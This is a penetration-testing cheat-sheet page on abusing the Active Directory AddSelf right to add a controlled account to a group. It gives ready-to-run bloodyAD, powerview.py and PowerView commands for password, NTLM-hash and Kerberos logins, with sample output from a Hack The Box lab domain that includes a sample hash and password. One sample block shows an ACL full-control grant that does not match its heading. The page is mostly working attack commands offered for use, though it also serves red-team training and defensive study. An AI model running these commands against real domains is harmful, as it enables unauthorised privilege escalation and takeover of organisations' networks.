---
title: "AddSelf"
tags: ["Active Directory", "AddSelf", "AddMember", "Addself", "BloodyAD", "Domain Controller", "Genericall", "Group Policy", "Powerview", "Windows"]
---

{{< filter_buttons >}}

### Add Self to Group

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}
{{< tab set1-1 tab1 active >}}bloodyAD{{< /tab >}}{{< tab set1-1 tab2 >}}powerview.py{{< /tab >}}
{{< tabcontent set1-1 tab1 >}}

#### 1. Add Self to Group

```console {class="password"}
# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember '<GROUP>' '<USER>'
```

```console {class="ntlm"}
# NTLM
bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> add groupMember '<GROUP>' '<USER>'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add groupMember '<GROUP>' '<USER>'
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> add groupMember '<GROUP>' '<USER>'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> add groupMember '<GROUP>' '<USER>'
```

<small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>

{{< /tabcontent >}}
{{< tabcontent set1-1 tab2 >}}

#### 1. Connect

```console {class="password"}
# Password
powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>'
```

```console {class="sample-code"}
$ powerview 'haze.htb/haze-it-backup$:Password123!@DC01.haze.htb'
╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
╰─PV ❯ 
```

```console {class="ntlm"}
# NTLM
powerview '<DOMAIN>/<USER>@<TARGET>' -H '<HASH>'
```

```console {class="sample-code"}
$ powerview 'haze.htb/haze-it-backup$@DC01.haze.htb' -H '735c02c6b2dc54c3c8c6891f55279ebc'
╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
╰─PV ❯ 
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' -k
```

```console {class="sample-code"}
$ powerview 'haze.htb/haze-it-backup$:Password123!@DC01.haze.htb' -k
╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
╰─PV ❯ 
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
powerview '<DOMAIN>/<USER>@<TARGET>' -H '<HASH>' -k
```

```console {class="sample-code"}
$ powerview 'haze.htb/haze-it-backup$@DC01.haze.htb' -H '735c02c6b2dc54c3c8c6891f55279ebc' -k
╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
╰─PV ❯ 
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
powerview '<DOMAIN>/<USER>@<TARGET>' -k
```

```console {class="sample-code"}
$ powerview 'haze.htb/haze-it-backup$@DC01.haze.htb' -k --no-pass
╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
╰─PV ❯ 
```

#### 2. Add Self to Group

```console
Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>'
```

```console {class="sample-code"}
╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
╰─PV ❯ Add-DomainObjectAcl -TargetIdentity 'SUPPORT_SERVICES' -PrincipalIdentity 'haze-it-backup$' -Rights fullcontrol
[2025-10-31 22:23:23] [Add-DomainObjectACL] Found target identity: CN=Support_Services,CN=Users,DC=haze,DC=htb
[2025-10-31 22:23:23] [Add-DomainObjectACL] Found principal identity: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
[2025-10-31 22:23:23] Adding FullControl to S-1-5-21-323145914-28650650-2368316563-1112
[2025-10-31 22:23:23] [Add-DomainObjectACL] Success! Added ACL to CN=Support_Services,CN=Users,DC=haze,DC=htb
```

<small>*Ref: [powerview.py](https://github.com/aniqfakhrul/powerview.py)*</small>

{{< /tabcontent >}}
{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}
{{< tab set1-2 tab1 active >}}powershell{{< /tab >}}
{{< tabcontent set1-2 tab1 >}}

#### 1. Import PowerView

```console
. .\PowerView.ps1
```

```console {class="sample-code"}
evil-winrm-py PS C:\programdata> . .\PowerView.ps1
```

#### 2. Add Self to the Group

```console
Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>'
```

```console {class="sample-code"}
evil-winrm-py PS C:\programdata> Add-DomainGroupMember -Identity 'SUPPORT_SERVICES' -Members 'haze-it-backup$'
```

#### 4. Check

```console
Get-DomainGroupMember -Identity '<GROUP>' -Domain <DOMAIN> -DomainController <DC> | fl MemberName
```

```console {class="sample-code"}
evil-winrm-py PS C:\programdata> Get-DomainGroupMember -Identity 'SUPPORT_SERVICES' -Domain haze.htb -DomainController dc01.haze.htb | fl MemberName

MemberName : Haze-IT-Backup$
```

{{< /tabcontent >}}
{{< /tabcontent >}}